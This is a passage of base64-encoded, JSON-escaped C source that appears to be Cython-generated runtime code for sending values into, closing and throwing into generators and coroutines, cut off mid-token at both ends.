GKHZhbCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNpZiBDWVRIT05fVVNFX0FNX1NFTkRcbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHRcbl9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGdlbl9hbV9zZW5kLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgUHlPYmplY3QgKnJldCA9IE5VTEw7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IGRlbGVnYXRlX3Jlc3VsdCwgcmVzdWx0O1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7XG4gICAgZGVsZWdhdGVfcmVzdWx0ID0gZ2VuX2FtX3NlbmQoZ2VuLT55aWVsZGZyb20sIHZhbHVlLCAmcmV0KTtcbiAgICBpZiAoZGVsZWdhdGVfcmVzdWx0ID09IFBZR0VOX05FWFQpIHtcbiAgICAgICAgYXNzZXJ0IChyZXQgIT0gTlVMTCk7XG4gICAgICAgICpyZXR2YWwgPSByZXQ7XG4gICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgIH1cbiAgICBhc3NlcnQgKGRlbGVnYXRlX3Jlc3VsdCAhPSBQWUdFTl9FUlJPUiB8fCByZXQgPT0gTlVMTCk7XG4gICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgcmV0LCByZXR2YWwsIDApO1xuICAgIFB5X1hERUNSRUYocmV0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUpIHtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0FtU2VuZChzZWxmLCB2YWx1ZSwgJnJldHZhbCk7XG4gICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0dmFsLCAwKTtcbn1cbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHRcbl9fUHl4X0Nvcm91dGluZV9BbVNlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXR2YWwpIHtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCopIHNlbGY7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkge1xuICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRUb0RlbGVnYXRlKGdlbiwgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCwgdmFsdWUsIHJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tKSB7XG4gICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgI2lmICFDWVRIT05fVVNFX0FNX1NFTkRcbiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kKHlmLCB2YWx1ZSk7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlmIChfX3B5eF9QeUFzeW5jR2VuQVNlbmRfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X2FzeW5jX2dlbl9hc2VuZF9zZW5kKHlmLCB2YWx1ZSk7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICBpZiAoUHlHZW5fQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5R2VuX1NlbmQoKFB5R2VuT2JqZWN0Kil5ZiwgdmFsdWUgPT0gUHlfTm9uZSA/IE5VTEwgOiB2YWx1ZSk7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICBpZiAoUHlDb3JvX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIHZhbHVlID09IFB5X05vbmUgPyBOVUxMIDogdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAjZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMFxuICAgICAgICAgICAgaWYgKHZhbHVlID09IFB5X05vbmUgJiYgUHlJdGVyX0NoZWNrKHlmKSlcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbih5Zik7XG4gICAgICAgICAgICBlbHNlXG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMSh5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbmQsIHZhbHVlKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAobGlrZWx5KHJldCkpIHtcbiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICAqcmV0dmFsID0gcmV0O1xuICAgICAgICAgICAgcmV0dXJuIFBZR0VOX05FWFQ7XG4gICAgICAgIH1cbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCByZXR2YWwpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWx1ZSwgcmV0dmFsLCAwKTtcbiAgICB9XG4gICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludCBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VJdGVyKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqeWYpIHtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGdlbik7XG4gICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTtcbiAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICBpZiAoX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVjayh5ZikpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHlmLCAmcmV0dmFsKTtcbiAgICB9IGVsc2VcbiAgICBpZiAoX19QeXhfQ29yb3V0aW5lQXdhaXRfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lQXdhaXRfQ2xvc2UoKF9fcHl4X0Nvcm91dGluZUF3YWl0T2JqZWN0Kil5Zik7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgIHJldHZhbCA9IF9fUHl4X2FzeW5jX2dlbl9hc2VuZF9jbG9zZSh5ZiwgTlVMTCk7XG4gICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2VcbiAgICBpZiAoX19weXhfUHlBc3luY0dlbkFUaHJvd19DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXR2YWwgPSBfX1B5eF9hc3luY19nZW5fYXRocm93X2Nsb3NlKHlmLCBOVUxMKTtcbiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKm1ldGg7XG4gICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjtcbiAgICAgICAgbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xvc2UpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1ldGgpKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoeWYpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dmFsID0gX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKG1ldGgpO1xuICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFyZXR2YWwpKSB7XG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gUFlHRU5fRVJST1I7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG4gICAgUHlfWERFQ1JFRihyZXR2YWwpO1xuICAgIHJldHVybiByZXN1bHQgPT0gUFlHRU5fRVJST1IgPyAtMSA6IDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9OZXh0KFB5T2JqZWN0ICpzZWxmKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgfVxuICAgICNpZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgICBpZiAoZ2VuLT55aWVsZGZyb21fYW1fc2VuZCkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoZ2VuLCBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kLCBQeV9Ob25lLCAmcmV0dmFsKTtcbiAgICB9IGVsc2VcbiAgICAjZW5kaWZcbiAgICBpZiAoZ2VuLT55aWVsZGZyb20pIHtcbiAgICAgICAgUHlPYmplY3QgKnlmID0gZ2VuLT55aWVsZGZyb207XG4gICAgICAgIFB5T2JqZWN0ICpyZXQ7XG4gICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRFxuICAgICAgICBpZiAoX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9HZW5lcmF0b3JfTmV4dCh5Zik7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kKHlmLCBQeV9Ob25lKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwQTMgfHwgIUNZVEhPTl9VU0VfQU1fU0VORClcbiAgICAgICAgaWYgKFB5R2VuX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIE5VTEwpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICByZXQgPSBfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbih5Zik7XG4gICAgICAgIGlmIChsaWtlbHkocmV0KSkge1xuICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgICAgIHJldHVybiByZXQ7XG4gICAgICAgIH1cbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCAmcmV0dmFsKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgUHlfTm9uZSwgJnJldHZhbCwgMCk7XG4gICAgfVxuICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0dmFsLCAxKTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykge1xuICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoYXJnKTtcbiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2Uoc2VsZiwgJnJldHZhbCk7XG4gICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9FUlJPUikpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIFB5X1hERUNSRUYocmV0dmFsKTtcbiAgICBQeV9SRVRVUk5fTk9ORTtcbn1cbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHRcbl9fUHl4X0Nvcm91dGluZV9DbG9zZShQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKipyZXR2YWwpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgIFB5T2JqZWN0ICp5ZjtcbiAgICBpbnQgZXJyID0gMDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7XG4gICAgICAgICpyZXR2YWwgPSBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pO1xuICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7XG4gICAgfVxuICAgIHlmID0gZ2VuLT55aWVsZGZyb207XG4gICAgaWYgKHlmKSB7XG4gICAgICAgIFB5X0lOQ1JFRih5Zik7XG4gICAgICAgIGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7XG4gICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7XG4gICAgICAgIFB5X0RFQ1JFRih5Zik7XG4gICAgfVxuICAgIGlmIChlcnIgPT0gMClcbiAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19HZW5lcmF0b3JFeGl0KTtcbiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgTlVMTCwgcmV0dmFsLCAxKTtcbiAgICBpZiAocmVzdWx0ID09IFBZR0VOX0VSUk9SKSB7XG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICBpZiAoIV9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47XG4gICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMyKFB5RXhjX0dlbmVyYXRvckV4aXQsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkge1xuICAgICAgICAgICAgX19QeXhfUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH0gZWxzZSBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgKnJldHZhbCA9PSBQeV9Ob25lKSkge1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGNvbnN0IGNoYXIgKm1zZztcbiAgICAgICAgUHlfREVDUkVGKCpyZXR2YWwpO1xuICAgICAgICAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgaWYgKCgwKSkge1xuICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soc2VsZikpIHtcbiAgICAgICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkge1xuICAgICAgICAgICAgbXNnID0gImFzeW5jIGdlbmVyYXRvciBpZ25vcmVkIEdlbmVyYXRvckV4aXQiO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIG1zZyA9ICJnZW5lcmF0b3IgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjtcbiAgICAgICAgfVxuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCBtc2cpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7XG4gICAgfVxufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwLCBQeU9iamVjdCAqdmFsLCBQeU9iamVjdCAqdGIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3MsIGludCBjbG9zZV9vbl9nZW5leGl0KSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7XG4gICAgUHlPYmplY3QgKnlmO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpXG4gICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pO1xuICAgIHlmID0gZ2VuLT55aWVsZGZyb207XG4gICAgaWYgKHlmKSB7XG4gICAgICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgICAgIFB5T2JqZWN0ICpyZXQ7XG4gICAgICAgIFB5X0lOQ1JFRih5Zik7XG4gICAgICAgIGlmIChfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXModHlwLCBQeUV4Y19HZW5lcmF0b3JFeGl0KSAmJiBjbG9zZV9vbl9nZW5leGl0KSB7XG4gICAgICAgICAgICBpbnQgZXJyID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihnZW4sIHlmKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICAgICAgaWYgKGVyciA8IDApXG4gICAgICAgICAgICAgICAgZ290byBwcm9wYWdhdGVfZXhjZXB0aW9uO1xuICAgICAgICAgICAgZ290byB0aHJvd19oZXJlO1xuICAgICAgICB9XG4gICAgICAgIGlmICgwXG4gICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRFxuICAgICAgICAgICAgfHwgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpXG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICAgICAgICAgIHx8IF9fUHl4X0Nvcm91dGluZV9DaGVjayh5ZilcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICApIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X19Db3JvdXRpbmVfVGhyb3coeWYsIHR5cCwgdmFsLCB0YiwgYXJncywgY2xvc2Vfb25fZ2VuZXhpdCk7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X0Nvcm91dGluZUF3YWl0X0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KCgoX19weXhfQ29yb3V0aW5lQXdhaXRPYmplY3QqKXlmKS0+Y29yb3V0aW5lLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICptZXRoID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJvdyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1ldGgpKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHlmKTtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7XG4gICAgICAgICAgICAgICAgZ290byB0aHJvd19oZXJlO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKGxpa2VseShhcmdzKSkge1xuICAgICAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwobWV0aCwgYXJncywgTlVMTCk7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjYXJnc1s0XSA9IHtOVUxMLCB0eXAsIHZhbCwgdGJ9O1xuICAgICAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKG1ldGgsIGNhcmdzKzEsIDMgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRih5Zik7XG4gICAgICAgIGlmIChyZXQpIHtcbiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICByZXR1cm4gcmV0O1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgJnJldCk7XG4gICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldCwgMCk7XG4gICAgfVxudGhyb3dfaGVyZTpcbiAgICBfX1B5eF9SYWlzZSh0eXAsIHZhbCwgdGIsIE5VTEwpO1xucHJvcGFnYXRlX2V4Y2VwdGlvbjpcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIE5VTEwsICZyZXR2YWwsIDApO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDApO1xuICAgIH1cbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJncykge1xuICAgIFB5T2JqZWN0ICp0eXA7XG4gICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7XG4gICAgUHlPYmplY3QgKnRiID0gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1VucGFja1R1cGxlKGFyZ3MsICJ0aHJvdyIsIDEsIDMsICZ0eXAsICZ2YWwsICZ0YikpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gX19QeXhfX0Nvcm91dGluZV9UaHJvdyhzZWxmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIDEpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZV9leGNzdGF0ZShfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGUsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7XG4jaWYgUFlfVkVSU0lPTl9